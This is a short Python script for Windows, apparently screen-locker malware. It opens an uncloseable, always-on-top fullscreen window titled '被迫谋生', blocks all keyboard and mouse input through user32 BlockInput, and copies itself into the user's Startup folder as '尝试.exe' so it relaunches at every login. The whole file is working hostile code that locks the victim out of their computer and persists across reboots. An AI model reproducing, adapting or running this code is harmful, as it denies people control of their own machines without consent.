import tkinter as tk
import pyautogui
import os
import shutil
from ctypes import windll as wDll


def GetWindowPos():
    global X,Y
    X = win.winfo_geometry().split("+")[1]
    Y = win.winfo_geometry().split("+")[2]
    win.bind_all('<Configure>', HoldOn)

def HoldOn(event):
    win.geometry("+{}+{}".format(X,Y))
global win
win = tk.Tk()
win.after(100,GetWindowPos)
w = win.winfo_screenwidth()

h = win.winfo_screenheight()

win.geometry("%dx%d" %(w,h))
win.attributes("-topmost",True)
win.attributes('-toolwindow',2)

win.config(background='white')

win.state('zoomed')


win.title('被迫谋生')
pyautogui.press(['ctrl', 'win'])
win.lift()
win.resizable(False,False)

def no_closing():
    pass

win.protocol('WM_DELETE_WINDOW', no_closing)
wd = wDll.LoadLibrary('user32.dll')
wd.BlockInput(True)

user = os.environ.get('USERNAME') 

startup_path = fr'C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'

import sys
print( sys.argv[0] ) # 打包成exe运行时是exe文件的绝对路径；以脚本运行时是自身文件名，不包含路径
try:
    shutil.copyfile(sys.argv[0], startup_path+'\尝试.exe')
except:
    pass



win.mainloop()
    
